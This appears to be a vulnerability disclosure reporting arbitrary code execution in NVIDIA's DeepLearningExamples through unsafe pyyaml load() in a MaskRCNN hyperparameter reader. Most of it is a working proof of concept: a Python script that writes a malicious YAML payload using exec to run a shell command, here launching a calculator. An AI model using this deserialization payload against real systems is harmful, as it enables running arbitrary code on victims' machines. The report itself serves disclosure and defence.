# Description
**Arbitrary Code Excecution** in NVIDIA/DeepLearningExamples.This repository provides State-of-the-Art Deep Learning examples that are easy to train and deploy, achieving the best reproducible accuracy and performance with NVIDIA CUDA-X software stack running on NVIDIA Volta, Turing and Ampere GPUs.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **pyyaml**
# Exploit code
**Python File**
```python
import params_dict
import os

os.system('git clone https://github.com/NVIDIA/DeepLearningExamples.git')
os.chdir('DeepLearningExamples/TensorFlow2/Segmentation/MaskRCNN/mask_rcnn/hyperparameters/')
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
  """
open('exploit.yml','w+').write(exploit)
params_dict.read_yaml_to_params_dict('exploit.yml')
```
# POC
* Run the python Exploit code 
![](https://cdn.discordapp.com/attachments/749019614352244777/784446865860067358/Screenshot_from_2020-12-04_21-15-52.png)
